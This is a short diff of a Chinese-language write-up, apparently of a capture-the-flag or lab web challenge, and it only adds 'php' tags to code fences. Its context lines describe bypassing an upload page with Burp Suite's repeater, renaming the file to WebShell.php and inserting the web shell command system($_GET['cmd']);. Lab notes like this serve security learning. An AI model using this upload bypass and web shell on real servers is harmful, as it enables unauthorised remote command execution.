@@ -6,7 +6,7 @@
 給了一個網址，點開來是一個簡單的上傳頁面：
 ![[W1-7_web.png|386]]
 網頁原始碼：
-```
+```php
 <?php
     if (!empty($_FILES)) {
 		$file = $_FILES['file']['tmp_name'];
@@ -45,7 +45,7 @@
 	3. 在 request 的地方按右鍵 -> send to repeater，可以將 request 複製一份編輯後重新送出
 	   ![[W1-7_repeater.png|453]]
 2. 修改送出的內容，把 `filename` 改成另一個名字，並加入惡意 php 程式，這邊加入取得 shell 的指令 `system($_GET['cmd']);`
-   ```
+   ```php
    ------WebKitFormBoundary3A8rm1u8Q0tPjDdT
 	Content-Disposition: form-data; name="file"; filename="WebShell.php"
 	Content-Type: text/plaintext
